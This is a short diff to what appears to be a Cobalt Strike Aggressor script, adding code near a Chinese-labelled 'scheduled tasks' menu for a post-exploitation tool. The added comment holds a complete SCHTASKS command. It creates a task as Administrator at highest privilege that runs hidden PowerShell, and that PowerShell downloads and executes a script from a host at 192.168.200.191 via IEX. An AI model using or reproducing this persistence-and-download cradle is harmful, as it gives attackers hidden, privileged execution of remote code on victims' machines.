@@ -415,6 +415,10 @@ sub StartUp{
 	}
 }
 
+
+# https://www.coder.work/article/562756   计划任务命令行中使用单引号。 shell SCHTASKS /Create /TN \Tempaa /TR "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\\\"http://192.168.200.191:8060/a22\\\"))\"" /RU Administrator /SC ONCE /ST 18:16 /RL HIGHEST /F
+
+
 menu "计划任务"{
 	item "查询计划任务" {
 		local('$bid');
